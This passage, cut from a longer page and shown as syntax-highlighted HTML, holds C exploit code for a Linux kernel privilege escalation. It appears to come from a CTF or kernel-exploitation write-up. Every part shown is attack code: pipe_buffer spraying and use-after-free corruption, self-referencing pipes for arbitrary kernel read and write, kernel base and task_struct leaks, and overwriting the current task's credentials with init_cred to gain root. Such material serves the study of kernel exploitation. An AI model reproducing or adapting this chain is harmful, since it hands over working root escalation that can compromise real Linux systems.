class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(a3_str, <span class="hljs-string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;<br>            orig_pid = nr;<br>            victim_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, <br>                   victim_pid, orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">24</span> - <span class="hljs-number">3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free original pipe...&quot;</span>);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> <br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, <br>           info_pipe_buf.page, info_pipe_buf.ops);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>) info_pipe_buf.page &lt; <span class="hljs-number">0xffff000000000000</span><br>        || (<span class="hljs-type">size_t</span>) info_pipe_buf.ops &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-hit victim page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-comment">/* construct a second-level page uaf */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);<br>    info_pipe_buf.page = (<span class="hljs-keyword">struct</span> page*) ((<span class="hljs-type">size_t</span>) info_pipe_buf.page + <span class="hljs-number">0x40</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(nr));<br>        <span class="hljs-keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) &#123;<br>            snd_orig_pid = nr;<br>            snd_vicitm_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, <br>                   snd_vicitm_pid, snd_orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (snd_vicitm_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VI - SECONDARY exploit stage: build pipe for arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">building_self_writing_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> trd_pipe_sz = <span class="hljs-number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_pipe_buf</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page_ptr</span>;</span><br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="hljs-number">24</span> <span class="hljs-number">-3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free second-level original pipe...&quot;</span>);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* let a pipe-&gt;bufs pointing to itself */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.page = info_pipe_buf.page;<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.ops = info_pipe_buf.ops;<br>    evil_pipe_buf.flags = info_pipe_buf.flags;<br>    evil_pipe_buf.private = info_pipe_buf.private;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_2nd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, <br>                    self_2nd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_2nd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 3rd pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_3rd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_3rd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 4th pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_4th_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_4th_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_2nd_buf</span>, <span class="hljs-title">evil_3rd_buf</span>, <span class="hljs-title">evil_4th_buf</span>;</span><br><span class="hljs-type">char</span> temp_zero_buf[<span class="hljs-number">0x1000</span>]= &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Setting up 3 pipes for arbitrary read &amp; write.</span><br><span class="hljs-comment"> * We need to build a circle there for continuously memory seeking:</span><br><span class="hljs-comment"> * - 2nd pipe to search</span><br><span class="hljs-comment"> * - 3rd pipe to change 4th pipe</span><br><span class="hljs-comment"> * - 4th pipe to change 2nd and 3rd pipe</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup_evil_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0xff0</span>;<br><br>    <span class="hljs-comment">/* hijack the 3rd pipe pointing to 4th */</span><br>    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="hljs-number">3</span>;<br>    evil_3rd_buf.len = <span class="hljs-number">0</span>;<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_4th_buf.len = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_read, <span class="hljs-type">void</span> *dst)</span><br>&#123;<br>    <span class="hljs-comment">/* page to read */</span><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0x1ff8</span>;<br>    evil_2nd_buf.page = page_to_read;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* read out data */</span><br>    read(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xfff</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-comment">/* page to write */</span><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], src, len);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VII - FINAL exploit stage with arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="hljs-number">0x1000</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_leaking_by_arbitrary_pipe</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> *comm_addr;<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);<br>    setup_evil_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span><br><span class="hljs-comment">     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span><br><span class="hljs-comment">     * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span><br><span class="hljs-comment">     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span><br><span class="hljs-comment">     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span><br><span class="hljs-comment">     */</span><br>    vmemmap_base = (<span class="hljs-type">size_t</span>) info_pipe_buf.page &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + <span class="hljs-number">157</span> * <span class="hljs-number">0x40</span>), buf);<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x070</span>)) &#123;<br>            kernel_base = buf[<span class="hljs-number">0</span>] -  <span class="hljs-number">0x070</span>;<br>            kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, <br>                   kernel_base, kernel_offset);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        vmemmap_base -= <span class="hljs-number">0x10000000</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * For a machine with MEM less than 256M, we can simply get the:</span><br><span class="hljs-comment">     *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span><br><span class="hljs-comment">     * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span><br><span class="hljs-comment">     * So we need to find another way to calculate the page_offset_base.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Luckily the task_struct::ptraced points to itself, so we can get the</span><br><span class="hljs-comment">     * page_offset_base by vmmemap and current task_struct as we know the page.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Note that the offset of different filed should be referred to your env.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>), buf);<br>    <br>        comm_addr = memmem(buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-57</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-56</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-57</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-50</span>] - <span class="hljs-number">2528</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-50</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,<br>                   (<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) ptask_page_addr, buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (ptask_page_addr+<span class="hljs-number">0x40</span>),&amp;buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">309</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">309</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">363</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">377</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">363</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">364</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">377</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span 